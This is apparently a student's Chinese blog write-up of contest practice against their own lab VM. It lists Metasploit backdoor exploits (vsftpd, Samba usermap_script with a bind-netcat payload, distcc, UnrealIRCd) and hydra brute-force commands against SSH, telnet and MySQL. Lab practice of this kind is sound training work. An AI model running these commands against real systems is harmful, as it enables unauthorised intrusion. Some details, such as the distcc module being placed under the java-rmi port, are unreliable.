中职网络安全攻防阶段

  • 2021-05-18
  • 作者 yueyue
  • 1218 字
  • 次阅读
本文最后编辑于 前，其中的内容可能需要更新。

由于这是我自己弄的靶机 没有别人 跟正常的第二阶段有很大区别
分为三部分 自己感觉
第一部分:先攻击进自己的靶机
第二部分:再对自己的靶机进行各种加固
第三部分:进攻别的人靶机获取flag

第一部分
1.先nmap 扫描一下 扫描出来了21,22,23,53,80等等服务

2.(1)利用21端口ftp,进行攻击
终端输入msfconsole
利用exploit/unix/ftp/vsftpd_234_backdoor

设置参数
show options
set rhost 192.168.32.131
set lport 21
run

输入passwd root 设置root密码为root

(2)ssh弱口令,进行爆破 22端口
输入hydra -l root -P 5.txt ssh://192.168.32.131
5.txt是我自己弄的密码字典
-l 是用户的意思
-P 是密码字典的意思
ssh 是指ssh端口
192.168.32.131 是我自己的靶机ip
爆破出密码是root

(3)telnet端口,进行爆破. 23端口 跟ssh端口差不多都是hydra进行爆破
输入hydra -l root -P 5.txt telnet://192.168.32.131
telnet 是指telnet端口 剩下的配置都跟上面的一样

(4)netbios-ssn :139和445端口 进行攻击
利用只支持samba 3.X - 4.X

利用msf攻击
利用use multi/samba/usermap_script

设置配置
输入set payload cmd/unix/bind_netcat
set rhost 192.168.32.131
run

(5)java-rmi端口 1099端口
利用use explout/unix/misc/distcc_exec
set rhost 192.168.32.131
run

(6) mysql数据库爆破 3306
输入hydra -l root -P 5.txt mysql://192.168.32.131
mysql为mysql端口 数据库密码为123456

(7)irc端口漏洞 6667端口
设置参数
利用use exploit/unix/irc/unreal_ircd_3281_backdoor
set rhost 192.168.32.131
run

犹豫我太菜也只会这些漏洞利用
我这里是利用 为了ssh需要跑字典
就直接利用 vsftpd_234_backdoor漏洞进行修改密码

ssh 192.168.32.131
root@192.168.32.131‘s password: (输入密码)

现在已经攻击进自己的靶机
